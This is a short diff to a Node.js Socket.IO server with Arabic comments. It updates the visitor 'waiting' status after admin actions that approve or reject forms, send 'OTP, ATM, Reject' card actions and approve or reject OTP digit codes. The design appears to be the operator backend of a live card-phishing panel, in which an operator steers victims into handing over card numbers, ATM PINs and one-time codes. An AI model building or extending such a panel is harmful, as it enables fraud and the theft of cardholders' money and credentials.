@@ -484,6 +484,13 @@ io.on("connection", (socket) => {
   // Admin: Approve form
   socket.on("admin:approve", (visitorSocketId) => {
     io.to(visitorSocketId).emit("form:approved");
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
     console.log(`Form approved for visitor: ${visitorSocketId}`);
   });
 
@@ -491,6 +498,13 @@ io.on("connection", (socket) => {
   socket.on("admin:reject", (data) => {
     const visitorSocketId = data.visitorSocketId || data;
     io.to(visitorSocketId).emit("form:rejected");
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
     console.log(`Form rejected for visitor: ${visitorSocketId}`);
   });
 
@@ -521,12 +535,26 @@ io.on("connection", (socket) => {
   // Admin: Card action (OTP, ATM, Reject)
   socket.on("admin:cardAction", ({ visitorSocketId, action }) => {
     io.to(visitorSocketId).emit("card:action", action);
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
     console.log(`Card action ${action} sent to visitor ${visitorSocketId}`);
   });
 
   // Admin: Code action (Approve, Reject) for OTP/digit codes
   socket.on("admin:codeAction", ({ visitorSocketId, action, codeIndex }) => {
     io.to(visitorSocketId).emit("code:action", { action, codeIndex });
+    // تحديث حالة الانتظار
+    const visitor = visitors.get(visitorSocketId);
+    if (visitor) {
+      visitor.waitingForAdminResponse = false;
+      visitors.set(visitorSocketId, visitor);
+      io.emit("visitors:update", Array.from(visitors.values()));
+    }
     console.log(`Code action ${action} sent to visitor ${visitorSocketId}`);
   });
 
